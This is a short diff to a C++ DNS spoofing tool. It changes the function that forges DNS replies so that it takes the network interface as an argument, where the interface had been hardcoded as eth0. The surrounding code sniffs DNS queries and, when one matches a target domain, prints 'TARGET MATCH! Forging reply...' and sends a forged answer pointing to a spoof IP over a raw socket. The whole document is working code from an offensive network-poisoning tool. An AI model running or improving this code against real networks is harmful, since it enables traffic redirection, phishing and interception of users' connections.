@@ -152,7 +152,7 @@ void DNS::spoof_loop(std::string interface) {
                 
                 if (requested_domain.find(this->target_domain) != std::string::npos) {
                     std::cout << C_GREEN << "[+] TARGET MATCH! Forging reply..." << C_RESET << std::endl;
-                    forge_response(sock, buffer, len, this->spoof_ip);
+                    forge_response(sock, buffer, len, this->spoof_ip, interface);
                 }
             } else {
                 //std::cout << "[DEBUG] Packet is not a standard query." << std::endl; // <--- ADD THIS
@@ -191,7 +191,7 @@ std::string DNS::parse_dns_name(uint8_t* buffer, int* offset, ssize_t max_len) {
     return name;
 }
 
-void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spoof_ip) {
+void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spoof_ip, std::string interface) {
     // 1. POINTERS
     struct ethhdr* eth = (struct ethhdr*)buffer;
     struct ip* iph = (struct ip*)(buffer + sizeof(struct ethhdr));
@@ -279,9 +279,7 @@ void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spo
     
     // Get Interface Index (Quickly)
     struct ifreq ifr;
-    // Note: In production, pass 'interface' string to this function. 
-    // For now, assuming eth0 is fine or you can pass it as argument.
-    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1); 
+    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ-1);
     ioctl(sock, SIOCGIFINDEX, &ifr);
     device.sll_ifindex = ifr.ifr_ifindex;
     
